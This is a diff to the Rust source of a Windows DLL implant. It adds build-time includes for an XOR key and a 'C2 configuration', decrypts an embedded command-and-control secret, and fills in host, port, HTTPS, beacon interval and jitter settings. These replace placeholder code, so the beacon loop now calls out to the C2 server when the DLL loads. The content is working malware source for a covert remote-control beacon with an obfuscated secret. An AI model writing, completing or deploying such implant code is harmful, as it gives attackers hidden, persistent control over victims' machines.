@@ -11,6 +11,11 @@ macro_rules! debug {
     };
 }
 
+// Build time generated key
+include!(concat!(env!("OUT_DIR"), "/xor_key.rs"));
+// C2 Configuration
+include!(concat!(env!("OUT_DIR"), "/c2_config.rs"));
+
 #[unsafe(no_mangle)]
 pub unsafe extern "system" fn DllMain(_instance: *mut ::core::ffi::c_void, reason: u32, _reserved: *mut ::core::ffi::c_void) -> i32 {
     if reason == 1 { // DLL_PROCESS_ATTACH
@@ -44,12 +49,20 @@ unsafe fn beacon_entry() {
 
     if !ssn_table::initialize_network() {
         return;
-    }
-    // TODO: Decrypt C2 secret and start beacon
-    let c2_config: beacon::C2Config = todo!("Fill the config");
-    beacon::beacon_loop(&c2_config);
+}
 
-    unimplemented!()
+    // Decrypt C2 secret and start beacon
+    let c2_secret: Vec<u8> =  C2_SECRET_ENC.iter().enumerate().map(|(i, b)| b ^ XOR_KEY[i % XOR_KEY.len()]).collect();
+    let c2_config: beacon::C2Config = beacon::C2Config {
+        host: &C2_HOST,
+        port: C2_PORT,
+        use_https: C2_HTTPS,
+        secret: &c2_secret,
+        interval_ms: C2_INTERVAL,
+        jitter_pct: C2_JITTER, 
+    };
+
+    beacon::beacon_loop(&c2_config);
 }
 
 extern crate alloc;
